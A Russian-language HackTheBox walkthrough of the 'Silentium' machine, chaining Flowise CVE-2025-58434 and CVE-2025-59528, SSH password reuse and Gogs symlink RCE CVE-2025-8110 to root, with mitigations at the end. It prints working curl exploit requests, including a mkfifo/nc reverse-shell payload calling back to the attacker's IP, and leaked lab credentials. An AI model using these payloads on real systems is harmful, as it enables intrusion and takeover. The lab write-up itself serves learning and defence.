# HackTheBox — Silentium

**OS:** Linux (Ubuntu 24.04)
**Точка входа:** Веб (Flowise на staging) → Docker-контейнер → SSH под ben → Gogs → CVE-2025-8110 → root

---

## 

На поддомене `staging.silentium.htb` крутится **Flowise 3.0.5** с двумя уязвимостями: сброс пароля без аутентификации (CVE-2025-58434) и RCE (CVE-2025-59528). Через них получаем **root внутри Docker-контейнера**, откуда из переменных окружения достаём пароль `r04D!!_R4ge` для SSH-пользователя `ben`. Дальше — Gogs на `127.0.0.1:3001`, эксплуатируем **CVE-2025-8110** и получаем **root на хосте** (Gogs запущен с `RUN_USER = root`).

---

## 1. Enumeration

### Nmap

```bash
nmap -T4 -A -v 10.129.144.227
```

```
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
```

Nmap сообщает о редиректе — добавляем хост в `/etc/hosts`:

```bash
echo "10.129.144.227  silentium.htb" | sudo tee -a /etc/hosts
```

### Virtual host fuzzing

На `silentium.htb` ничего интересного, но это виртуальный хост. Фаззим поддомены:

```bash
ffuf -H 'Host: FUZZ.silentium.htb' \
     -u http://silentium.htb \
     -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
     -fs 178
```

Результат:

```
staging                 [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 19ms]
```

Добавляем в hosts:

```bash
echo "10.129.144.227  staging.silentium.htb" | sudo tee -a /etc/hosts
```

На `staging.silentium.htb` — **Flowise**, просит логин. Дефолтные креды не подходят, версия не указана.

---

## 2. Foothold — Flowise

### CVE-2025-58434 — сброс пароля без аутентификации

Проверяем репозиторий Flowise на свежие CVE — находим **CVE-2025-58434**: сброс пароля без аутентификации. Нужен валидный email.

На главной странице `silentium.htb` — три имени: **Marcus Thorne**, **Ben**, **Elena Rossi**. Пробуем `ben@silentium.htb`:

```bash
curl -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
     -H "Content-Type: application/json" \
     -d '{"user":{"email":"ben@silentium.htb"}}' | jq .
```

Ответ:

```json
{
  "user": {
    "id": "e26c9d6c-678c-4c10-9e36-01813e8fea73",
    "name": "admin",
    "email": "ben@silentium.htb",
    "credential": "$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG",
    "tempToken": "Y7Lu3Z5j52Hjc75m5nJr41ocV7Zuti78FLQl6fb2uppIw60QkfUiE9s9adpTdD83",
    "tokenExpiry": "2026-05-24T21:30:43.390Z",
    "status": "active",
    ...
  }
}
```

Получили `tempToken`. Сбрасываем пароль:

```bash
curl -X POST http://staging.silentium.htb/api/v1/account/reset-password \
     -H "Content-Type: application/json" \
     -d '{
       "user":{
         "email":"ben@silentium.htb",
         "tempToken":"Y7Lu3Z5j52Hjc75m5nJr41ocV7Zuti78FLQl6fb2uppIw60QkfUiE9s9adpTdD83",
         "password":"NewPassword"
       }
     }'
```

Ответ `200 OK` — пароль сброшен.

### Вход и определение версии

Логинимся с `ben@silentium.htb` / `NewPassword`. В правом верхнем углу — значок шестерёнки, там версия:

```
Flowise 3.0.5
```

Это уязвимо для **CVE-2025-59528** — RCE.

### CVE-2025-59528 — RCE

Генерируем API-ключ в левой панели (или используем дефолтный). Проверяем RCE пингом на свой веб-сервер:

```bash
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
     -H "Content-Type: application/json" \
     -H "Authorization: Bearer <API_KEY>" \
     -d '{
       "loadMethod": "listActions",
       "inputs": {
         "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"ping -c 1 10.10.14.144\");return 1;})()})"
       }
     }'
```

Пинг дошёл — заменяем на reverse shell:

```bash
# слушатель
nc -lvnp 4444

# эксплойт
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
     -H "Content-Type: application/json" \
     -H "Authorization: Bearer <API_KEY>" \
     -d '{
       "loadMethod": "listActions",
       "inputs": {
         "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.144 4444 >/tmp/f\");return 1;})()})"
       }
     }'
```

Получаем **root внутри Docker-контейнера**.

---

## 3. Shell as ben

В контейнере — root, но нужно выбраться на хост. Смотрим переменные окружения:

```bash
env
```

Находим:

```
FLOWISE_PASSWORD=F1l3_d0ck3r
FLOWISE_USERNAME=ben
SMTP_PASSWORD=r04D!!_R4ge
SMTP_USERNAME=test
SENDER_EMAIL=ben@silentium.htb
```

Пароль `r04D!!_R4ge` подходит для SSH-пользователя `ben` на хосте:

```bash
ssh ben@silentium.htb
# пароль: r04D!!_R4ge
```

> Если ssh зависает на `expecting SSH2_MSG_KEX_ECDH_REPLY` — понижаем MTU:
> ```bash
> sudo ip link set dev tun0 mtu 1200
> ```

Мы на хосте под `ben`.

---

## 4. Разведка на хосте

```bash
ben@silentium:~$ ss -tlnp
```

Видим Gogs на `127.0.0.1:3001` — только loopback, снаружи недоступен. Смотрим конфиг:

```bash
cat /opt/gogs/gogs/custom/conf/app.ini
```

Ключевое:

```ini
RUN_USER = root
```

Gogs работает **от root** — любая RCE через него даст сразу root.

---

## 5. Port Forwarding

Пробрасываем `3001` на Kali:

```bash
ssh -N -L 3001:127.0.0.1:3001 ben@silentium.htb
```

Проверяем:

```bash
curl -s http://localhost:3001 | head
```

```
<!DOCTYPE html>
<html>
<head data-suburl="">
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
	...
		<meta name="author" content="Gogs" />
```

Gogs доступен локально на Kali. Открываем `http://localhost:3001`.

---

## 6. CVE-2025-8110 — Gogs RCE

### Суть

Gogs не проверяет, является ли файл, перезаписываемый через `PUT /api/v1/repos/.../contents/<file>`, симлинком. Атакующий:

1. Пушит симлинк `malicious_link -> .git/config`.
2. Через API записывает в него вредоносный `.git/config` со строкой `sshCommand = <reverse shell>`.
3. Gogs следует за симлинком и перезаписывает **свой собственный** `.git/config`.
4. При следующей SSH-операции Gogs выполняет `sshCommand` — RCE.

### Подготовка

**Окно 1 — слушатель:**

```bash
nc -lvnp 4444
```

**Окно 2 — SSH-туннель (не закрывать):**

```bash
ssh -N -L 3001:127.0.0.1:3001 ben@silentium.htb
```

**Окно 3 — эксплойт:**

Узнаём свой `tun0` IP:

```bash
ip a show tun0 | grep inet
# inet 10.10.14.144/23 ...
```

Запускаем PoC (адаптированный под Silentium — с `-un`/`-pw` для существующего пользователя, что обходит капчу при регистрации):

```bash
python3 CVE-2025-8110.py \
  -u http://localhost:3001 \
  -lh 10.10.14.144 \
  -lp 4444 \
  -un NewUsers \
  -pw GogsPassword
```

### Вывод эксплойта

```
[+] Authenticated successfully
Token generation status: 200
[+] Application token: 44d191f24805eb4f165162eeb943700496590414
Repo creation status: 201
Клонирование в «/tmp/caaafaf0fa74»...
...
[master f5f79a4] Add malicious symlink
 1 file changed, 1 insertion(+)
 create mode 120000 malicious_link
...
To http://localhost:3001/NewUsers/caaafaf0fa74.git
   8812c81..f5f79a4  master -> master
[+] Exploit sent, check your listener!
[-] Error: HTTPConnectionPool(host='localhost', port=3001): Read timed out. (read timeout=5)
```

> `Read timed out` — **ожидаемый признак успеха**. Gogs выполнил наш `sshCommand` и ушёл в reverse shell вместо ответа на HTTP-запрос.

---

## 7. Root

В окне слушателя:

```
listening on [any] 4444 ...
connect to [10.10.14.144] from (UNKNOWN) [10.129.144.227] 40198
bash: cannot set terminal process group (1491): Inappropriate ioctl for device
bash: no job control in this shell
root@silentium:/opt/gogs/gogs/data/tmp/local-repo/1# id
uid=0(root) gid=0(root) groups=0(root)
```

**Сразу root**, потому что `RUN_USER = root`.

### Стабилизация TTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

`Ctrl+Z`, в Kali:

```bash
stty raw -echo; fg
```

Enter, Enter. В шелле:

```bash
export TERM=xterm
export SHELL=/bin/bash
stty rows 40 cols 160
```

---

## 8. Flags

```bash
root@silentium:~# cat /home/ben/user.txt
a44ec12e354a9ae38b0574fc7888a19a

root@silentium:~# cat /root/root.txt
52198fb7afbca1b6bb01ab68db1c6324
```

---

## 9. Итог / Mitigation

### Цепочка атаки

```
Recon (nmap, ffuf)
   └── staging.silentium.htb → Flowise 3.0.5
         ├── CVE-2025-58434 (сброс пароля без аутентификации)
         │     └── доступ к админке Flowise
         └── CVE-2025-59528 (RCE)
               └── root в Docker-контейнере
                     └── env: SMTP_PASSWORD=r04D!!_R4ge
                           └── SSH ben@silentium.htb
                                 └── Gogs на 127.0.0.1:3001 (RUN_USER = root)
                                       └── SSH-туннель -L 3001:127.0.0.1:3001
                                             └── CVE-2025-8110 (symlink → .git/config → sshCommand)
                                                   └── RCE от root
                                                         └── root.txt
```

### Как чинить

1. **Flowise**: обновить до версии, где закрыты CVE-2025-58434 и CVE-2025-59528. Сброс пароля должен требовать подтверждения по email, а не отдавать `tempToken` в ответе API.
2. **Не хранить секреты в переменных окружения контейнера.** `SMTP_PASSWORD`, `FLOWISE_PASSWORD` — всё это утекает при первом же RCE. Использовать секрет-менеджер.
3. **Не переиспользовать пароли.** `r04D!!_R4ge` от SMTP сработал для SSH — так быть не должно.
4. **Gogs**: обновить до версии, где закрыт CVE-2025-8110 (валидация симлинков в API контента).
5. **Не запускать Gogs от root.** `RUN_USER = root` превращает любую RCE в полный захват хоста. Обязательно — отдельный непривилегированный пользователь.
6. **Ограничить права на `.git/config`** — Gogs не должен иметь возможности перезаписывать собственные конфиги гита.
7. **Мониторинг**: отслеживать создание симлинков в репозиториях и подозрительные изменения `sshCommand`.

### Что запомнить

- `Read timed out` в web-эксплойтах — часто не ошибка, а признак, что payload отработал.
- `ssh -N -L` надёжнее escape-последовательности `~C`.
- Всегда проверяйте `env` в контейнере — секреты часто лежат там в открытом виде.
- Всегда проверяйте `RUN_USER` в конфигах сервисов — частая причина «бесплатного» root.
- CVE-2025-8110 — отличный пример того, почему нельзя доверять симлинкам при работе с файловыми API.

### Капча (CAPTCHA)

Используется адаптированный под Silentium PoC:
https://github.com/ixZODiAK/CVE-2025-8110

Это форк оригинального zAbuQasem/gogs-CVE-2025-8110, который принимает
флаги `-un` и `-pw` для уже существующего пользователя Gogs —
это обходит капчу, включённую на Silentium (`ENABLE_REGISTRATION_CAPTCHA = true`).

**Машина пройдена. GG!** 🚀
